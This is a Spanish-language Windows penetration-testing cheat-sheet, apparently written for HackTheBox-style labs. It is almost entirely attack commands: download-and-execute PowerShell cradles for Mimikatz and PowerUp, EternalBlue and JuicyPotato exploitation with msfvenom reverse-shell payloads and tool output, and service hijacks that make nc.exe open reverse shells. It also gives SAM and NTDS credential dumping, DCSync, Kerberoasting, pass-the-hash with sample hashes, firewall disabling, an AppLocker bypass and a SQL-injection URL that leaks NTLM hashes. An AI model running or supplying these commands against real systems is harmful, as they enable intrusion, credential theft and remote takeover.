---
title: Windows Cheat-Sheet
date: 2020-07-03 23:26:55 +/-0800
categories: [Windows,HackTheBox]
tags: []
image: /assets/img/Post/WindowsC.jpg
---

## ENUMERACIÓN

¿Cual es el sistema operativo y que arquitectura tiene? ¿Le faltan parches?
```console
$ systeminfo
$ wmic qfe
```
¿Quién eres tú?
```console
# whoami
$ echo %USERNAME%
$ $env:UserName
```

¿Algún privilegio de usuario interesante?
```console
$ whoami /priv
```

¿Qué usuarios están en el sistema?
```console
$ net users
$ dir /b /ad "C:\Users\"
$ dir /b /ad "C:\Documents and Settings\" # Windows XP and below

$ Get-LocalUser | ft Name,Enabled,LastLogon
$ Get-ChildItem C:\Users -Force | select Name
```

¿Qué grupos hay en el sistema?
```console
$ net localgroup
$ Get-LocalGroup | ft Name
```

¿Alguien más ha iniciado sesión?
```console
$ qwinsta
```

¿Que usuarios pertenecen al grupo de administradores?
```console
$ net localgroup Administrators
$ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

¿Hay algunas credenciales en el winlogon?
```console
$ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
$ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```

¿Algo interesante en Credential Manager?
```console
$ cmdkey /list
$ dir C:\Users\username\AppData\Local\Microsoft\Credentials\
$ dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
$ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
$ Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
¿Podemos acceder a los archivos SAM y SYSTEM?
```console
$ %SYSTEMROOT%\repair\SAM
$ %SYSTEMROOT%\System32\config\RegBack\SAM
$ %SYSTEMROOT%\System32\config\SAM
$ %SYSTEMROOT%\repair\system
$ %SYSTEMROOT%\System32\config\SYSTEM
$ %SYSTEMROOT%\System32\config\RegBack\system
```

¿Qué software está instalado?
```console
$ dir /a "C:\Program Files"
$ dir /a "C:\Program Files (x86)"
$ reg query HKEY_LOCAL_MACHINE\SOFTWARE
$ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
$ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

Enumeración SMB.

```console
$ smbmap -R -H \\<ip>
$ smbclient -L \\<ip> -N
$ smbclient \\<ip>\share -U <user>
$ smbget -R <ip>
```

Powershell PortScan.

```console
$ 0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<ip>",$_)) "Port $_ is open!"} 2>$null
```

## SCRIPTS

#### PowerUp.ps1

```console
$ powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://[IP]:PORT/PowerUp.ps1');Invoke-AllChecks
```
#### Sherlock.ps1

```console
$ powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://[IP]:PORT/Sherlock.ps1');Find-AllVulns
```

#### Mimikatz.ps1
```console
$ IEX(New-Object Net.WebClient).downloadString('<url>/MimiKatz.ps1') ;Invoke-Mimikatz -DumpCreds
```

#### Windows-Exploit-Suggester
```console
$ ./windows-exploit-suggester.py --update
$ ./windows-exploit-suggester.py --database xxxx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt 
```


## EXPLOITS

#### seImpersonateprivilege - JuicyPotato.exe


> <https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe>

```console
$  \\[IP]\smbFolder\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a " /C \\[IP]\smbFolder\nc.exe -e cmd [IP] [PUERTO]" -t *
```
> Si el CLSID no es el correcto puede buscarlo en el siguiente articulo: <https://ohpe.it/juicy-potato/CLSID/>
  una vez lo encuentre insertelo en el comando de arriba con el parametro -c {CLSID}.


#### EternalBlue (MS17-010).

![Desktop View]({{ "/assets/img/Posts/Windows-Cheet-Sheet/ETERNALBLUE.jpg" }}) 

`Explotación de EternalBlue #1`

> AutoBlue: <https://github.com/3ndG4me/AutoBlue-MS17-010>

```console
$ eternal_checker.py [IP]
```
```console
$ sudo ./shell_prep.sh
sudo ./shell_prep.sh
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
[TUIP]
LPORT you want x64 to listen on:
[TUPUERTO] 
LPORT you want x86 to listen on:
[TUPUERTO]
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.19 LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.19 LPORT=1235
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
```

```console
$ python eternalblue_exploit7.py [IP] shellcode/sc_all.bin
```

`Explotación de EternalBlue #2`

> MS17-010(1): <https://github.com/helviojunior/MS17-010>

```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[TUPUERTO] -f exe > eternalblue.exe
```

```console
$ python send_and_execute.py [IP] eternalblue.exe 445 [PIPE]
```


`Explotación de EternalBlue #3`

> MS17-10: <https://github.com/worawit/MS17-010>

```console
$ python checker.py [IP]

```
modificamos el archivo zzz_exploit.py

```console
$ service_exec(conn, r'cmd /c {comando a ejecutar}')
```

```console
$ python zzz_exploit.py [IP] [pipes]
```

#### MS14-068 - Vulnerabilidad de Kerberos

> <https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py>

```console
$ python goldenPac.py domain.net/USER:PASS11@domain-host
```


## SERVICIOS


```
$ sc start <nombre>
$ sc stop <nombre>
$ Start-Service -Name <nombre>
$ Stop-Service -Name <nombre> -Force
$ Get-Service -Name <nombre>
$ Get-Childitem -recurse HKLM:\SYSTEM\CurrentControlSet\Services | where name -like "Servicio"
```

#### UsoSvc Privilage Escalation.
```console
$ sc.exe stop UsoSvc
$ sc.exe config UsoSvc binpath= "cmd \c C:\Temp\nc.exe [IP] [PUERTO] -e cmd.exe"
$ sc.exe qc usosvc
$ sc.exe start UsoSvc
```

#### SecLogon Privilage Escalation.

```console
$ reg query HKLM\System\CurrentControlSet\Services\seclogon
$ reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "c:\Temp\nc.exe [TUIP] [TUPUERTP] -e cmd.exe" /f
$ sc start seclogon
```


## AD PRIVILAGE ESCALATION

#### DnsAdmin Privilage Escalation.
 
```console
$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f dll > privesc.dll
$ dnscmd RESOLUTE.LOCAL /config /serverlevelplugindll \\PATH
$ sc stop dns
$ sc start dns
```
#### AD Recycle Bin

Recuperar objetos de un DC.

```console
$  Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects  -property *
```

#### Azure Admins

> <https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1>

```console
$ Import-Module .\Azure-ADConnect.ps1
$ Azure-ADConnect -server [IP] -db ADSync
```

#### SeBackupPrivilege

`#1 Creamos un archivo: priv.txt`

```
set context persistent nowriters
add volume c: alias intrusion
create
expose %intrusion% x:
```

`#2 Lo transferimos a la máquina y ejecutamos.`

```
$ diskshadow.exe /s C:\intrusion\priv.txt
```

`#3 Transferimos los .dll,importamos los módulos, copiamos el ntds.dit y el SYSTEM.`

```console
$ Import-Module .\SeBackupPrivilegeUtils.dll
$ Import-Module .\SeBackupPrivilegeCmdLets.dll
$ Set-SeBackupPrivilege
$ Copy-FileSeBackupPrivilege x:\Windows\NTDS\ntds.dit c:\intrusion\ntds.dit
$ reg save HKLM\SYSTEM c:\intrusion\system
```
#### Dump NTDS.dit
```console
$ secretsdump.py -ntds ntds.dit -system system -hashes LMHASH:NTHASH  local -outputfile nt-hashes
```

#### DCSync

```console
$ secretsdump.py -just-dc-user Administrator DOMAIN/USER:PASSWORD@[IP]
```

#### Kerberoast
```console
$ GetUserSPNs.py -request -dc-ip [IP] DOMAIN/USER
```
```console
$ powershell.exe -Command 'IEX (New-Object Net.Webclient).DownloadString("http://[IP]:[PORT]/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat Hashcat
```


#### ASREPRoast
```console
$ cme ldap [IP] -u users.txt -p '' --asreproast AR_REP --kdcHost [IP]
```

```console
# python GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile output.txt
```

#### Passthehash.

```console
$ psexec.py -hashes ad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff Administrator@[IP]
```

```console
$ pth-winexe -U WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 //[IP] cmd.exe
```
#### Dump Hashes NTLM

```console
$ secretsdump.py -just-dc-ntlm MEGABANK.LOCAL/Administrator:PASS@[]IP
```


## ESCRITORIO REMOTO

`Una vez que tengas acceso como administrador.`

```console
$ netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
$ netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=out localport=3389 action=allow
$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
& xfreerdp /u:USER /d:DOMAIN /p:PASSWORD /v:[IP]
```


## CAMBIAR DE USUARIO POWERSHELL

```console
$ $username = 'batman'
$ $password = 'Zx^#QZX+T!123'
$ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$ $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
$ enter-pssession -computername arkham -credential $credential
```


```console
$ $user = 'DOMAIN\USER'
$ $pw = 'PASSWORD'
$ $secpw = ConvertTo-SecureString $pw -AsPlainText -Force
$ $cred = New-Object System.Management.Automation.PSCredential $user,$secpw
$ Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {c:\Temp\nc.exe [TUIP] [TUPORT]}
```

## DESCARGA DE ARCHIVOS

```console
$ certutil.exe -f -urlcache -split http://[IP]/archivo archivo
```

```console
$ powershell IEX(New-Object Net-WebClient).downloadFile('http://[IP]/archivo','C:\Temp\archivo')
```

```console
$ copy \\[IP]\Recurso\archivo
```

```console
$ IWR -URI http://[IP]/archivo -OutFile archivo
```

```console
$ Invoke-WebRequest http://[IP]/archivo -OutFile archivo
```

#### Descarga e interpreta.
```console
$ powershell IEX(New-Object Net-WebClient).downloadString('http://[IP]/archivo.ps1')
```
`Recuerda poner el nombre de la funcion que quieras invocar al final del script}`


## POWERSHELL NATIVA
```console
$ C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://[IP]/script.ps1')
```

#### Historial de Powershell

> C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline


## FIREWALL
Listar reglas de firewall.
```console
$ netsh advfirewall firewall show rule name=all
```
Desactivar Firewall
```console
$ netsh Advfirewall set allprofiles state off
```

## PORT FORWARDING

```console
# plink.exe -l root -pw [TUPASSWORD] -R 445:127.0.0.1:445 [TUIP]
```

```console
$  ssh -R [TUPUERTO]:localhost:80 user@[IP]
```

## APPLOCKER BYPASS MSBuild

```console
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[TUIP] LPORT=[TUPUERTO] -f csharp -e x86/shikata_ga_nai -i [NUM] > output.cs
```
> <https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml>

```console
$ C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\file.csproj
```

## UAC

```console
$ $executioncontext.sessionstate.languagemode 
```

```console
$  (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
```


#### SMB Relay via MSSQL

Encendemos el reponder

```console
$ responder -I tun0  -r -d -w -v
```

> http://example.com/mvc/Product.aspx?ProductSubCategoryId=28;declare @q varchar(99);set @q='\\[IP]\test';exec master.dbo.xp_dirtree @q

```
[SMB] NTLMv2-SSP Client   : x.x.x.x
[SMB] NTLMv2-SSP Username : example\example
[SMB] NTLMv2-SSP Hash     : Exapme::example:3836b33745f3a34e:5C9090CA87239EDC83EBECFD1C8DE863:0101000000000000C0653150DE09D2016F7D1FB2C317EC3D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000005690C5FD3744C7EFC6832CDAA32270D100257A53238D9C45FD1E1BEDD27C53B00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E003300370000000000000000000000000
```


